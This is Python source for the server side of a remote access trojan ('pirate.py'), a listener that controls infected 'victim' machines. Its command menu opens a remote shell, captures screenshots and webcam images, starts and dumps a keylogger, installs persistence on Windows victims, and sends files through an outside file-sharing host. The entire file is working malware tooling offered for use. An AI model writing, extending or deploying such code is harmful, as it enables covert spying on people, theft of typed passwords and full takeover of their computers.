from socket import socket, AF_INET, SOCK_STREAM
import sys
import os
import requests
import time

class RAT:
    def __init__(self, port):
        self.address = ('',port)
        self.port = port
        self.socket = socket(AF_INET, SOCK_STREAM)
        self.keylogger_started = False

    def banner(self):
        print('''	
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@''')

    def listen(self):
        s = self.socket
        s.bind(self.address)
        s.listen()
        print('\n[*] Listening on port: %i'%self.port)
        self.conn, self.addr = s.accept()
        print('[+] Connection received from',self.addr)
        self.main()
    def clear(self):
        if sys.platform.startswith('win'):
            os.system('cls')
        else:
            os.system('clear')
    def help(self):
        print('sysinfo       ::  show victims system info')
        print('shell         ::  open shell on victim machine')
        print('screenshot    ::  take screenshot from victim machine')
        print('webcam        ::  take picture from victims webcam')
        print('send_file     ::  send file to victim machine')
        print('persistence   ::  run persistence script (windows victim only)')
        print('keylogger     ::  run keylogger on victim machine')
        print('msg           ::  open MessageBox on victim machine (windows victim only)')
        print('help          ::  show this message')
        print('clear         ::  clear console')  
        print()

    def main(self):
        print()
        started = self.keylogger_started
        while 1:
            EXIT = False
            conn = self.conn
            cmd = input('pirate@%s> '%self.addr[0])
            if cmd == 'shell':
                conn.send(cmd.encode())
                print(conn.recv(1024).decode(),end="")
                while EXIT != True:
                    cmd = input('> ')
                    if cmd == 'exit':
                        EXIT = True
                        print()
                    elif cmd == '' or cmd == ' ':
                        pass
                    else:
                        conn.send(('shell:'+cmd).encode())
                        print(conn.recv(40960).decode('Latin-1'),end="")
            elif cmd == 'clear':
                self.clear()
            elif cmd == 'help':
                self.help()

            elif cmd == 'screenshot':
                runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
                filename = 'screenshot-%s.png'%runtime
                conn.send('screenshot'.encode())
                url = conn.recv(1024).decode()
                content = requests.get(url).content
                with open(filename,'wb') as img:
                    img.write(content)
                    img.close()
                print('screenshot saved as: %s\n'%filename)
            
            elif cmd == 'webcam':
                runtime = time.asctime()[11:].replace(' ','-').replace(':','-')
                filename = 'image-%s.jpg'%runtime
                conn.send(cmd.encode())
                url = conn.recv(1024).decode()
                content = requests.get(url).content
                with open(filename,'wb') as img:
                    img.write(content)
                    img.close()
                print('webcam image saved as: %s\n'%filename)

            elif cmd.startswith('send_file'):
                if cmd == 'send_file':
                    print('Usage: send_file <file_name>\n')
                if len(cmd.split(' ')) == 2:
                    filename = cmd.split(' ')[1]
                    if os.path.isfile(filename):
                        url = 'https://transfer.sh/'
                        data = open(filename, 'rb')
                        upload = {filename: data}
                        response = requests.post(url, files=upload)
                        data.close()
                        download_link = response.content.decode('utf-8')
                        conn.send(('file:'+download_link).encode())
                        print('File sended!')
                    else:
                        print('Error!\nFile not found!')
            
            elif cmd == 'persistence':
                conn.send(cmd.encode())
                msg = conn.recv(1024).decode()
                print(msg)
            elif cmd.startswith('keylogger'):
                if cmd == 'keylogger':
                    print('Usage:')
                    print('keylogger --start')
                    print('keylogger --dump')
                    print('kelogger --stop')
                elif cmd.startswith('keylogger --'):
                    msg = 'keylogger:'+cmd.split('--')[1]            
                    conn.send(msg.encode())
                    if cmd == 'keylogger --start':
                        started = True
                    elif cmd == 'keylogger --stop':
                        started = False
                    if cmd == 'keylogger --dump':
                        if started:
                            print(conn.recv(2048).decode())
                        else:
                            print('[!] Error, keylogger not started!')

            elif cmd == 'sysinfo':
                conn.send(cmd.encode())
                sysinfo = conn.recv(4096).decode('Latin_1')
                print(sysinfo)

            elif cmd == 'msg':
                print('Usage: msg <your_message>')
            
            elif cmd.startswith('msg '):
                msg = cmd[4:]
                conn.send(str('msg:'+msg).encode())
                print('Sended!')
            elif cmd == '':
                pass

            elif cmd == 'exit':
                exit()
            else:
                print('Invalid command!\n')
    
def init():
    if len(sys.argv) >= 2:
        main = RAT(int(sys.argv[1]))
        main.clear()
        #main.banner()
        main.listen()
    else:
        print('Usage: pirate.py <port>')

init()
